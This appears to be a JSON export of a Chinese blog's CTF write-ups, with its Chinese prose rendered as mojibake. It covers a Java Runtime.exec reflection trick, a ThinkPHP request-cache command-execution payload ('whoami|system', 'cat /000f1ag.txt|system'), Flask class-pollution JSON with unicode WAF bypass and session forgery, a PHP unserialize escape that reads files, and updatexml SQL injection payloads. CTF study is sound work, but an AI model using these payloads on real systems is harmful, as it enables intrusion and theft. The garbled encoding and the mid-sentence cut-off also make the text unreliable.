æ¢æˆåå°„å†™æ³• 12Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.newInstance(),&quot;calc&quot;); è¿™é‡Œç›´æ¥ clazz.newInstance() åªæœ‰æœ‰æ— å‚æ„é€ å™¨çš„æ—¶å€™æ‰èƒ½è¿™æ ·å†™ï¼Œæœ‰å‚çš„è¯å°±å¯ä»¥ç”¨ Constructorï¼ˆå½“ç„¶æ— å‚ä¹Ÿå¯ä»¥ç”¨ å¯æƒœæŠ¥é”™äº† å› ä¸º Runtime çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œè€Œ newInstance ä¸èƒ½è°ƒç”¨ç§æœ‰çš„æ„é€ æ–¹æ³•ã€‚æ­£ç¡®çš„åšæ³•æ˜¯ä½¿ç”¨ Runtime ç±»æä¾›çš„é™æ€æ–¹æ³• getRuntime() æ¥è·å–å”¯ä¸€çš„ Runtime å®ä¾‹ï¼Œç„¶åè°ƒç”¨ exec æ–¹æ³•ï¼š 12Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc&quot;);","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"title":"ctfshow è¥¿ç“œæ¯ Web å¤ç°","path":"/2024/07/24/ctf/XGBCTF/","content":"å‘¨æœ«å‡ºå»ç©äº†ï¼Œæ²¡æ‰“è¥¿ç“œæ¯ï¼Œç›´æ¥å¤ç°å§ tpdoorä¸‹è½½é™„ä»¶å…ˆ 123456789101112131415161718192021222324&lt;?phpnamespace app\\controller;use app\\BaseController;use think\\facade\\Db;class Index extends BaseController&#123; protected $middleware = [&#x27;think\\middleware\\AllowCrossDomain&#x27;,&#x27;think\\middleware\\CheckRequestCache&#x27;,&#x27;think\\middleware\\LoadLangPack&#x27;,&#x27;think\\middleware\\SessionInit&#x27;]; public function index($isCache = false , $cacheTime = 3600) &#123; if($isCache == true)&#123; $config = require __DIR__.&#x27;/../../config/route.php&#x27;; $config[&#x27;request_cache_key&#x27;] = $isCache; $config[&#x27;request_cache_expire&#x27;] = intval($cacheTime); $config[&#x27;request_cache_except&#x27;] = []; file_put_contents(__DIR__.&#x27;/../../config/route.php&#x27;, &#x27;&lt;?php return &#x27;. var_export($config, true). &#x27;;&#x27;); return &#x27;cache is enabled&#x27;; &#125;else&#123; return &#x27;Welcome ,cache is disabled&#x27;; &#125; &#125;&#125; çœ‹ä¸å‡ºä»€ä¹ˆï¼Œå†çœ‹ä¸€ä¸‹ç½‘ç«™ï¼Œlogo æ˜¯ tpï¼ŒåŠ ä¸ŠæŠ¥é”™é¡µé¢ thinkphp çš„æ¨¡æ¿æ¡†æ¶æ— ç–‘ v8.0 ç½‘ä¸Šæ²¡ä»€ä¹ˆæ¼æ´ï¼Œé‚£åº”è¯¥æ˜¯è¿™ä¸ªé¡µé¢å†™äº†æ¼æ´ï¼Œè¿˜å¾—ä¸‹è½½æºç åˆ†æã€‚æ³¨æ„è¿™é‡Œä¸èƒ½å»ä¸‹ github ä¸Šçš„ tpï¼Œä¼šå°‘æ–‡ä»¶ï¼ŒæŒ‰ç…§å®˜ç½‘çš„æ­¥éª¤ç”¨ composer å®‰è£…å³å¯ã€‚ï¼ˆæˆ‘å®‰åœ¨äº†kaliä¸‹ï¼Œç„¶åç§»å‡ºæ¥çœ‹çš„ https://doc.thinkphp.cn/v8_0/setup.html å¯ä»¥çœ‹åˆ°é¶æœºçš„æºç æ˜¯åœ¨ controller ä¸‹ index.php æ–‡ä»¶,æˆ‘ä»¬å¤åˆ¶ç„¶åæ›¿æ¢åˆ°æºç é‡Œé¢ã€‚ æ³¨æ„åˆ° index.php é‡Œæˆ‘ä»¬å¯æ§çš„å‚æ•°æ˜¯ $isCacheï¼Œ$isCacheï¼Œä¹Ÿå°±æ˜¯ $config[â€˜request_cache_keyâ€™]ï¼Œ$config[â€˜request_cache_expireâ€™] 12$config[&#x27;request_cache_key&#x27;] = $isCache;$config[&#x27;request_cache_expire&#x27;] = intval($cacheTime); æœ€åçœ‹æŠŠ $config å†™å…¥äº† &#x2F;..&#x2F;..&#x2F;config&#x2F;route.php 1file_put_contents(__DIR__.&#x27;/../../config/route.php&#x27;, &#x27;&lt;?php return &#x27;. var_export($config, true). &#x27;;&#x27;); æ‰€ä»¥æŸ¥æ‰¾ config&#x2F;route.php 1234567891011121314151617181920212223&lt;?php return array ( &#x27;pathinfo_depr&#x27; =&gt; &#x27;/&#x27;, &#x27;url_html_suffix&#x27; =&gt; &#x27;html&#x27;, &#x27;url_common_param&#x27; =&gt; true, &#x27;url_lazy_route&#x27; =&gt; false, &#x27;url_route_must&#x27; =&gt; false, &#x27;route_rule_merge&#x27; =&gt; false, &#x27;route_complete_match&#x27; =&gt; false, &#x27;controller_layer&#x27; =&gt; &#x27;controller&#x27;, &#x27;empty_controller&#x27; =&gt; &#x27;Error&#x27;, &#x27;controller_suffix&#x27; =&gt; false, &#x27;default_route_pattern&#x27; =&gt; &#x27;[\\\\w\\\\.]+&#x27;, &#x27;request_cache_key&#x27; =&gt; true, &#x27;request_cache_expire&#x27; =&gt; 1, &#x27;request_cache_except&#x27; =&gt; array ( ), &#x27;default_controller&#x27; =&gt; &#x27;Index&#x27;, &#x27;default_action&#x27; =&gt; &#x27;index&#x27;, &#x27;action_suffix&#x27; =&gt; &#x27;&#x27;, &#x27;default_jsonp_handler&#x27; =&gt; &#x27;jsonpReturn&#x27;, &#x27;var_jsonp_handler&#x27; =&gt; &#x27;callback&#x27;,); å…ˆä»å¯æ§çš„ request_cache_key å¼€å§‹å…¨å±€æœç´¢ï¼Œæœ€ååœ¨ CheckRequestCache.php é¡µé¢æ‰¾åˆ°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;?php// +----------------------------------------------------------------------// | ThinkPHP [ WE CAN DO IT JUST THINK ]// +----------------------------------------------------------------------// | Copyright (c) 2006~2023 http://thinkphp.cn All rights reserved.// +----------------------------------------------------------------------// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )// +----------------------------------------------------------------------// | Author: liu21st &lt;liu21st@gmail.com&gt;// +----------------------------------------------------------------------declare(strict_types=1);namespace think\\middleware;use Closure;use think\\Cache;use think\\Config;use think\\Request;use think\\Response;/** * è¯·æ±‚ç¼“å­˜å¤„ç† */class CheckRequestCache&#123; /** * ç¼“å­˜å¯¹è±¡ * @var Cache */ protected $cache; /** * é…ç½®å‚æ•° * @var array */ protected $config = [ // è¯·æ±‚ç¼“å­˜è§„åˆ™ trueä¸ºè‡ªåŠ¨è§„åˆ™ &#x27;request_cache_key&#x27; =&gt; true, // è¯·æ±‚ç¼“å­˜æœ‰æ•ˆæœŸ &#x27;request_cache_expire&#x27; =&gt; null, // å…¨å±€è¯·æ±‚ç¼“å­˜æ’é™¤è§„åˆ™ &#x27;request_cache_except&#x27; =&gt; [], // è¯·æ±‚ç¼“å­˜çš„Tag &#x27;request_cache_tag&#x27; =&gt; &#x27;&#x27;, ]; public function __construct(Cache $cache, Config $config) &#123; $this-&gt;cache = $cache; $this-&gt;config = array_merge($this-&gt;config, $config-&gt;get(&#x27;route&#x27;)); &#125; /** * è®¾ç½®å½“å‰åœ°å€çš„è¯·æ±‚ç¼“å­˜ * @access public * @param Request $request * @param Closure $next * @param mixed $cache * @return Response */ public function handle(Request $request, Closure $next, $cache = null): Response &#123; if ($request-&gt;isGet() &amp;&amp; false !== $cache) &#123; if (false === $this-&gt;config[&#x27;request_cache_key&#x27;]) &#123; // å…³é—­å½“å‰ç¼“å­˜ $cache = false; &#125; $cache = $cache ?? $this-&gt;getRequestCache($request); if ($cache) &#123; if (is_array($cache)) &#123; [$key, $expire, $tag] = array_pad($cache, 3, &#x27;&#x27;); &#125; else &#123; $key = md5($request-&gt;url(true)); $expire = $cache; $tag = &#x27;&#x27;; &#125; $key = $this-&gt;parseCacheKey($request, $key); if (strtotime($request-&gt;server(&#x27;HTTP_IF_MODIFIED_SINCE&#x27;, &#x27;&#x27;)) + $expire &gt; $request-&gt;server(&#x27;REQUEST_TIME&#x27;)) &#123; // è¯»å–ç¼“å­˜ return Response::create()-&gt;code(304); &#125; elseif (($hit = $this-&gt;cache-&gt;get($key)) !== null) &#123; [$content, $header, $when] = $hit; if (null === $expire || $when + $expire &gt; $request-&gt;server(&#x27;REQUEST_TIME&#x27;)) &#123; return Response::create($content)-&gt;header($header); &#125; &#125; &#125; &#125; $response = $next($request); if (isset($key) &amp;&amp; 200 == $response-&gt;getCode() &amp;&amp; $response-&gt;isAllowCache()) &#123; $header = $response-&gt;getHeader(); $header[&#x27;Cache-Control&#x27;] = &#x27;max-age=&#x27; . $expire . &#x27;,must-revalidate&#x27;; $header[&#x27;Last-Modified&#x27;] = gmdate(&#x27;D, d M Y H:i:s&#x27;) . &#x27; GMT&#x27;; $header[&#x27;Expires&#x27;] = gmdate(&#x27;D, d M Y H:i:s&#x27;, time() + $expire) . &#x27; GMT&#x27;; $this-&gt;cache-&gt;tag($tag)-&gt;set($key, [$response-&gt;getContent(), $header, time()], $expire); &#125; return $response; &#125; /** * è¯»å–å½“å‰åœ°å€çš„è¯·æ±‚ç¼“å­˜ä¿¡æ¯ * @access protected * @param Request $request * @return mixed */ protected function getRequestCache($request) &#123; $key = $this-&gt;config[&#x27;request_cache_key&#x27;]; $expire = $this-&gt;config[&#x27;request_cache_expire&#x27;]; $except = $this-&gt;config[&#x27;request_cache_except&#x27;]; $tag = $this-&gt;config[&#x27;request_cache_tag&#x27;]; foreach ($except as $rule) &#123; if (0 === stripos($request-&gt;url(), $rule)) &#123; return; &#125; &#125; return [$key, $expire, $tag]; &#125; /** * è¯»å–å½“å‰åœ°å€çš„è¯·æ±‚ç¼“å­˜ä¿¡æ¯ * @access protected * @param Request $request * @param mixed $key * @return null|string */ protected function parseCacheKey($request, $key) &#123; if ($key instanceof Closure) &#123; $key = call_user_func($key, $request); &#125; if (false === $key) &#123; // å…³é—­å½“å‰ç¼“å­˜ return; &#125; if (true === $key) &#123; // è‡ªåŠ¨ç¼“å­˜åŠŸèƒ½ $key = &#x27;__URL__&#x27;; &#125; elseif (str_contains($key, &#x27;|&#x27;)) &#123; [$key, $fun] = explode(&#x27;|&#x27;, $key); &#125; // ç‰¹æ®Šè§„åˆ™æ›¿æ¢ if (str_contains($key, &#x27;__&#x27;)) &#123; $key = str_replace([&#x27;__CONTROLLER__&#x27;, &#x27;__ACTION__&#x27;, &#x27;__URL__&#x27;], [$request-&gt;controller(), $request-&gt;action(), md5($request-&gt;url(true))], $key); &#125; if (str_contains($key, &#x27;:&#x27;)) &#123; $param = $request-&gt;param(); foreach ($param as $item =&gt; $val) &#123; if (is_string($val) &amp;&amp; str_contains($key, &#x27;:&#x27; . $item)) &#123; $key = str_replace(&#x27;:&#x27; . $item, (string) $val, $key); &#125; &#125; &#125; elseif (str_contains($key, &#x27;]&#x27;)) &#123; if (&#x27;[&#x27; . $request-&gt;ext() . &#x27;]&#x27; == $key) &#123; // ç¼“å­˜æŸä¸ªåç¼€çš„è¯·æ±‚ $key = md5($request-&gt;url()); &#125; else &#123; return; &#125; &#125; if (isset($fun)) &#123; $key = $fun($key); &#125; return $key; &#125;&#125; æ³¨æ„åˆ° 123if (isset($fun)) &#123; $key = $fun($key); &#125; å¾ˆåƒæ¼æ´ç‚¹ï¼Œç›´æ¥å¼€å§‹ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œæ³¨æ„å¾—å» &#x2F;public&#x2F;index.php é¡µé¢ä¸‹å¼€å§‹ debug,æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå¯èƒ½ tp å›¢é˜Ÿå®šä¹‰çš„è·¯ç”±è§„åˆ™ã€‚è¿˜è¦æ³¨æ„æŠŠ $cacheTime æ”¹ä¸º 1ï¼Œä¸ç„¶ä¼šæ‰§è¡Œå¾ˆä¹…ã€‚ åŠ¨æ€è°ƒè¯•æ—¶å‘ç°è¿›ä¸å»è¿™ä¸ªåˆ¤æ–­ï¼Œå‘ä¸Šæ‰¾ 123elseif (str_contains($key, &#x27;|&#x27;)) &#123; [$key, $fun] = explode(&#x27;|&#x27;, $key); &#125; åŸæ¥ç”¨ explode(â€˜|â€™, $key); æ¥å¾—åˆ° $fun,è€Œä¸”å‘ç°è¿™ä¸ª $key å°±æ˜¯ config[â€˜request_cache_keyâ€™]ã€‚æˆ‘ä»¬åœ¨ route.php ä¿®æ”¹ä¸€ä¸‹ 1&#x27;request_cache_key&#x27; =&gt; &quot;whoami|system&quot; ç„¶åå†åŠ¨æ€è°ƒè¯• æ‰§è¡ŒæˆåŠŸã€‚æœ€åæ ¹æ® tp è·¯ç”±è§„åˆ™å‘åŒ…å³å¯thinkPHP å‚æ•°ä¼ å…¥ - è½ä¸¶ - åšå®¢å›­ (cnblogs.com) 1https://225f8924-0efe-462c-b06b-49274664151e.challenge.ctf.show/index.php/index/index?isCache=cat /000f1ag.txt|system&amp;cacheTime=0 å› ä¸º cache ç¼“å­˜æ—¶é—´ï¼Œå¤šåˆ·æ–°å‡ éå°±èƒ½ rce äº† easy_pollutedæ ¹æ®é¢˜ç›®ååº”è¯¥æ˜¯åŸå‹é“¾æ±¡æŸ“ä¹‹ç±»çš„ï¼Œä¸‹è½½æºç çœ‹çœ‹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import Flask, session, redirect, url_for,request,render_templateimport osimport hashlibimport jsonimport redef generate_random_md5(): random_string = os.urandom(16) md5_hash = hashlib.md5(random_string) return md5_hash.hexdigest()def filter(user_input):a blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;] for pattern in blacklisted_patterns: if re.search(pattern, user_input, re.IGNORECASE): return True return Falsedef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)app = Flask(__name__)app.secret_key = generate_random_md5()class evil(): def __init__(self): pass@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])def index(): username = request.form.get(&#x27;username&#x27;) password = request.form.get(&#x27;password&#x27;) session[&quot;username&quot;] = username session[&quot;password&quot;] = password Evil = evil() if request.data: if filter(str(request.data)): return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot; else: merge(json.loads(request.data), Evil) return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot; return render_template(&quot;index.html&quot;)@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def templates(): username = session.get(&quot;username&quot;, None) password = session.get(&quot;password&quot;, None) if username and password: if username == &quot;adminer&quot; and password == app.secret_key: return render_template(&quot;flag.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read()) else: return &quot;Unauthorized&quot; else: return f&#x27;Hello, This is the POLLUTED page.&#x27;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) æ³¨æ„åˆ° admin è·¯ç”±ä¸‹å¯ä»¥è¯»å– flagï¼Œä½†æ˜¯ä¼šéªŒè¯ sessionï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ flask çš„session å¯ä»¥ä¼ªé€ ï¼Œä½†æ˜¯å¾—çŸ¥é“ secret_key ã€‚æ­£å¥½ Evil å®ä¾‹å¯ä»¥é€šè¿‡ merge å‡½æ•°æ±¡æŸ“ç¯å¢ƒå˜é‡ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ secret_key ä¸ºè‡ªå·±æƒ³è¦çš„ï¼Œç„¶åä¼ªé€  session ç­¾åé€šè¿‡éªŒè¯ã€‚ 0x01 merge æ±¡æŸ“æ ¹æ®è¿™ç¯‡æ–‡ç« å°±èƒ½ç†è§£æ±¡æŸ“åŸç†ã€‚æµ…è°ˆPythonåŸå‹é“¾æ±¡æŸ“åŠåˆ©ç”¨æ–¹å¼ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) åˆšå¥½æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Evil çš„ __init__ é­”æœ¯æ–¹æ³•æ¥æ¨é“¾å­ï¼ˆæ„Ÿè§‰åƒ ssti 123456789json_data = &#123; &quot;__init__&quot;: &#123; &quot;__globals__&quot;:&#123; &quot;app&quot;:&#123; &quot;secret_key&quot;:&quot;pass&quot; &#125; &#125; &#125; &#125; json æ•°æ®æ˜¯å› ä¸º 1merge(json.loads(request.data), Evil) æ³¨æ„åˆ°æœ‰ WAFï¼Œæˆ‘ä»¬å¯ä»¥ unicode ç¼–ç æ¥ç»•è¿‡ï¼Œjson_loads èƒ½è¯†åˆ« unicode 123456789&#123; &quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;: &#123; &quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;:&#123; &quot;\\u0061\\u0070\\u0070&quot;:&#123; &quot;\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079&quot;:&quot;pass&quot; &#125; &#125; &#125;&#125; 0x02 session ä¼ªé€ å¯¹flask sessionä¼ªé€ çš„å­¦ä¹  - GTL_JU - åšå®¢å›­ (cnblogs.com) 1python 1.py encode -s &#x27;pass&#x27; -t &quot;&#123;&#x27;password&#x27;: &#x27;pass&#x27;, &#x27;username&#x27;: &#x27;adminer&#x27;&#125;&quot; ç„¶åå¡«å…¥ session è®¿é—® admin è·¯ç”±ï¼Œè¿”å›åŒ… 12è¿™åˆæ˜¯ä»€ä¹ˆjinjaè¯­æ³•å•Šï¼ [#flag#] 0x04 æ±¡æŸ“ jinja å¼•æ“è¯­æ³•æç¤ºæˆ‘ä»¬ä¿®æ”¹ jinja çš„æ¨¡æ¿å¼•æ“è¯­æ³•ï¼Œæ­£å¸¸æ¥è¯´åº”è¯¥æ˜¯ &#123;&#123;&#125;&#125;,&#123;%%&#125;ã€‚æ­£å¥½æ¨¡æ¿è¯­æ³•çš„å®šä¹‰ä¹Ÿåœ¨ app ä¸‹ 12print(Evil.__init__.__globals__[&#x27;app&#x27;].jinja_env.variable_start_string)print(Evil.__init__.__globals__[&#x27;app&#x27;].jinja_env.variable_end_string) æ±¡æŸ“çš„è¯ jinja_env.variable_start_string æ”¹ä¸º [#,jinja_env.variable_end_string æ±¡æŸ“ä¸º #] å³å¯ã€‚ 123456789101112&#123; &quot;__init__&quot; : &#123; &quot;__globals__&quot; : &#123; &quot;app&quot; : &#123; &quot;jinja_env&quot; :&#123;&quot;variable_start_string&quot; : &quot;[#&quot;,&quot;variable_end_string&quot;:&quot;#]&quot; &#125; &#125; &#125; &#125; &#125; ä¸è¿‡å¾—é‡ç½®é¶æœºå†è®¿é—® admin ä¹‹å‰å°±è¦ä¿®æ”¹è¯­æ³•ï¼Œæˆ‘çŒœè¿™å’Œ flask çš„æ¸²æŸ“æœºåˆ¶æœ‰å…³ã€‚ é‡ç½®é¶æœºä¹‹åï¼Œç›´æ¥ key å’Œ jinja ä¸€èµ·ä¿®æ”¹ 12345678910111213&#123; &quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot; : &#123; &quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot; : &#123; &quot;\\u0061\\u0070\\u0070&quot; : &#123; &quot;\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u005f\\u006b\\u0065\\u0079&quot;:&quot;pass&quot;, &quot;\\u006a\\u0069\\u006e\\u006a\\u0061\\u005f\\u0065\\u006e\\u0076&quot; :&#123;&quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0074\\u0061\\u0072\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067&quot; : &quot;[#&quot;, &quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0065\\u006e\\u0064\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067&quot;:&quot;#]&quot; &#125; &#125; &#125; &#125; &#125; æœ€åå¸¦ç€ä¼ªé€ çš„ session è®¿é—® admin è·¯ç”±å¾—åˆ° flag 0x05 æ³•äºŒï¼šä¿®æ”¹ _static_folder ä¸ºæ ¹ç›®å½•_static_folder æ‰“å°å‡ºæ¥ä¸º staticï¼Œå½“æˆ‘ä»¬è®¿é—® url&#x2F;static&#x2F;1.js çš„æ—¶å€™æ˜¯ä¸ç”¨è·¯ç”±éªŒè¯çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠ _static_folder çš„å€¼æ”¹ä¸º â€œ&#x2F;â€œï¼Œè¿™æ ·è®¿é—® url&#x2F;static&#x2F; å°±å¯ä»¥æ˜ å°„æ ¹ç›®å½•ä¸‹çš„èµ„æº 1&#123;&quot;__init__&quot; : &#123;&quot;__globals__&quot; :&#123;&quot;app&quot; :&#123;&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;&#125; ç„¶åç›´æ¥è®¿é—® url&#x2F;static&#x2F;flag(è¿™é‡Œä¿®ä¸ä¿®æ”¹ key å·²ç»æ— æ‰€è°“äº†ã€‚ Ezzz_php1234567891011121314151617181920212223242526272829303132&lt;?php highlight_file(__FILE__);error_reporting(0);function substrstr($data)&#123; $start = mb_strpos($data, &quot;[&quot;); $end = mb_strpos($data, &quot;]&quot;); return mb_substr($data, $start + 1, $end - 1 - $start);&#125;class read_file&#123; public $start; public $filename=&quot;/etc/passwd&quot;; public function __construct($start)&#123; $this-&gt;start=$start; &#125; public function __destruct()&#123; if($this-&gt;start == &quot;gxngxngxn&quot;)&#123; echo &#x27;What you are reading is:&#x27;.file_get_contents($this-&gt;filename); &#125; &#125;&#125;if(isset($_GET[&#x27;start&#x27;]))&#123; $readfile = new read_file($_GET[&#x27;start&#x27;]); $read=isset($_GET[&#x27;read&#x27;])?$_GET[&#x27;read&#x27;]:&quot;I_want_to_Read_flag&quot;; if(preg_match(&quot;/\\[|\\]/i&quot;, $_GET[&#x27;read&#x27;]))&#123; die(&quot;NONONO!!!&quot;); &#125; $ctf = substrstr($read.&quot;[&quot;.serialize($readfile).&quot;]&quot;); unserialize($ctf);&#125;else&#123; echo &quot;Start_Funny_CTF!!!&quot;;&#125; Start_Funny_CTF!!! 0x01 å‰ç½®çŸ¥è¯†å…ˆæ¥äº†è§£ä¸¤ä¸ªå° tips 123456&lt;?phphighlight_file(__FILE__);echo mb_strpos($_GET[1].&quot;AAA&lt;BB&quot;, &#x27;&lt;&#x27;);echo &quot;&lt;/br&gt;&quot;;echo mb_substr($_GET[2].&quot;AAA&lt;BB&quot;,0,2);?&gt; 1?1=%9f&amp;2=%f0 è¾“å‡ºï¼š 123ï¿½AAA&lt; mb_strposè¿™ä¸ªå‡½æ•°åœ¨é‡åˆ° %9f è¿™ä¸ªä¸å¯è§å­—ç¬¦æ—¶ï¼Œä¼šè‡ªåŠ¨å¿½ç•¥ mb_substrï¼Œä»–ä¼šæŠŠ %f0 è¿ç€åé¢çš„ä¸‰ä¸ªå­—ç¬¦å½“æˆä¸€ä¸ªå­—ç¬¦æ¥è¯†åˆ« 0x02 æ„é€ é€ƒé€¸å…ˆæ„é€  1read = O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125; ç„¶åä¸æ–­åœ¨å‰é¢åŠ ä¸Š %9f è¿™æ ·å°±å¯ä»¥ä½¿æˆªå–é•¿åº¦ä¸å˜ï¼Œæˆªå–ä½ç½®æ”¹å˜ã€‚ 1read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&amp;start=gxngxngxn ä½†æ˜¯æ²¡æœ‰ &#x2F;flag é¡µé¢ã€‚è¦åˆ©ç”¨ file_get_contents($this-&gt;filename); æ¥rce ã€ç¿»è¯‘ã€‘ä»è®¾ç½®å­—ç¬¦é›†åˆ°RCEï¼šåˆ©ç”¨ GLIBC æ”»å‡» PHP å¼•æ“ï¼ˆç¯‡ä¸€ï¼‰ çœ‹ä¸æ‡‚ï¼Œå¼€æ‘†ã€‚ã€‚ã€‚","tags":["ctf","åˆ·é¢˜","æ¯”èµ›","åŸå‹é“¾æ±¡æŸ“","session ä¼ªé€ ","thinkphp","php","ååºåˆ—åŒ–"],"categories":["CTF"]},{"title":"buu Webç¬¬ä¸‰é¡µï¼ˆæŒç»­æ›´æ–°ï¼‰","path":"/2024/07/18/ctf/buu/WebPage 3/","content":"buuCTF webç¬¬ä¸‰é¡µåˆ·é¢˜è®°å½• [RCTF2015]EasySQLç™»é™†æ³¨å†Œé¡µé¢è²Œä¼¼æ²¡æœ‰ä»€ä¹ˆæ³¨å†Œç‚¹ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œæ¯”å¦‚ç©ºæ ¼ã€‚æ¥åˆ°ä¿®æ”¹å¯†ç é¡µé¢ï¼Œå‡å¦‚ä»¥ 1â€ æ³¨å†Œï¼Œå°±ä¼šäº§ç”ŸæŠ¥é”™ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; and pwd=&#39;c20ad4d76fe97759aa27a0c99bff6710&#39;&#39; at line 1 æ‰€ä»¥æ³¨å†Œç‚¹åº”è¯¥æ˜¯åœ¨è¿™é‡Œï¼Œå±äºæ˜¯äºŒæ¬¡æ³¨å…¥ SQLæ³¨å…¥ä¹‹äºŒæ¬¡æ³¨å…¥ï¼ˆè¯¦ç»†åŠ æ¼”ç¤ºï¼‰_sqläºŒæ¬¡æ³¨å…¥å¦‚ä½•æ³¨å…¥-CSDNåšå®¢ï¼Œæ—¢ç„¶æœ‰æŠ¥é”™ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥æ˜¯ä»€ä¹ˆï¼Ÿä¸€çœ‹ä½ å°±æ˜ç™½äº†ã€‚æŠ¥é”™æ³¨å…¥åŸç†+æ­¥éª¤+å®æˆ˜æ¡ˆä¾‹-CSDNåšå®¢ æ ¹æ®è¿™ä¸ªæŠ¥é”™çŒœæµ‹ä»£ç æ˜¯ 1select * from user where username=&quot;$user&quot; and password=&quot;$pwd&quot; æ¥ä¸‹æ¥çš„ payloadï¼ˆextractValueï¼Œç©ºæ ¼è¢«è¿‡æ»¤ï¼‰ 123456789101112131415# æŸ¥æ•°æ®åº“1&quot;||(updatexml(1,concat(&quot;~&quot;,(select(database()))),1))#web_sqli#æŸ¥è¡¨å1&quot;||(updatexml(1,concat(&quot;~&quot;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;web_sqli&#x27;))),1))#article,flag,users#æŸ¥åˆ—å1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#flag#æŸ¥æ•°æ®1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(flag))from(flag))),1))#RCTF&#123;Good job! But flag not her flag ä¸åœ¨è¿™ 123456#æŸ¥åˆ—å1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#~name,pwd,email,real_flag_1s_her#æŸ¥æ•°æ®1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_her))from(users))),1))# è¿™é‡Œç›´æ¥æŠ¥é”™äº†ï¼Œè¯´ä¸å­˜åœ¨ real_flag_1s_her å­—æ®µï¼Œæˆ‘ä»¬çŸ¥é“æŠ¥é”™æ³¨å…¥çš„è¿™äº›å‡½æ•°åªèƒ½å¸¦å‡º 32 ä½å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŠŠ â€˜~â€™ å»é™¤ 123451&quot;||(updatexml(1,concat((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#real_flag_1s_here1&quot;||(updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_here))from(users))),1))#xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx è¿™é‡Œæ˜¯å› 